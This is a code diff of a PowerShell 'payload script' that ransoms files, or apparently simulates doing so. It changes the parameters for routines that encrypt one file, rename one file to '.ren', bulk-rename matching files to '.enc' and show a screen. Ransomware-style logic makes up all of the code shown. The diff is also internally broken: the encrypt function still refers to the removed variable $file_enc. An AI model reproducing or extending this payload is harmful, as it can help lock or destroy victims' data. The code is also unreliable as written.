@@ -2,9 +2,8 @@
 #
 # set this parameters as variables before running the payload script
 #
-# $file_enc = single file to be encrypted. Ex: test.txt
-# $file_s_ren = single file to be only renamed. Ex: test.txt
-# $file_m_ren = multiple files to be only renamed. Ex: .db
+# $type = operation type single_enc, single_ren, multi_ren
+# $file = name of the file or filter for multi_ren. ex: test.txt or .db
 # if variable is not set the process will not be executed
 #
 # $file_drive = drive where the script will run. Ex: d
@@ -17,28 +16,31 @@
 if (-not($file_drive -eq "")) { $file_drive_long = $file_drive+":"; Set-Location "$file_drive:" }
 if (-not($file_path -eq "")) { Set-Location "$file_path" }
 
-if (-not($file_enc -eq "")) { Do_Single_File_ENC }
-if (-not($file_m_ren -eq "")) { Do_Multiple_Files_REN }
-if (-not($file_s_ren -eq "")) { Do_Single_File_REN }
+if ($type -eq "single_enc") { Do_Single_File_ENC }
+if ($type -eq "multi_ren") { Do_Multiple_Files_REN }
+if ($type -eq "single_ren") { Do_Single_File_REN }
 if ($show_screen.ToUpper() -eq "YES" -Or $show_screen.ToUpper() -eq "TRUE") { Do_Show_Screen }
 
 
 function Do_Single_File_REN {
+  if ($file -eq "") { return }    
   $curdir = get-location;  
-  $file_full_path = -join($curdir, $file_s_ren)
+  $file_full_path = -join($curdir, $file)
   if (-not(Test-Path -Path $file_full_path -PathType Leaf)) { return }
-  mv "$file_s_ren" "$file_s_ren.ren"
+  mv "$file" "$file.ren"
 }
 
 
 function Do_Multiple_Files_REN {
-  $file_count = (gci -Path . -File | where fullname -like "*$file_m_ren").Count
+  if ($file -eq "") { return }    
+  $file_count = (gci -Path . -File | where fullname -like "*$file").Count
   if ($file_count -eq "0") { exit }
-  get-childitem -path $path -filter "*$file_m_ren" | rename-item -newname {$_.name -replace "$file_m_ren","$file_m_ren.enc"}
+  get-childitem -path $path -filter "*$file" | rename-item -newname {$_.name -replace "$file","$file.enc"}
 }
 
 
 function Do_Single_File_ENC {
+  if ($file -eq "") { return }    
   if ($file_drive -eq "") { $file_drive = (get-location).Drive.Name }
   $file_exist = "$file_drive" + ":\" + "$file_enc"
   if (-not(Test-Path -Path $file_exist -PathType Leaf)) { return }
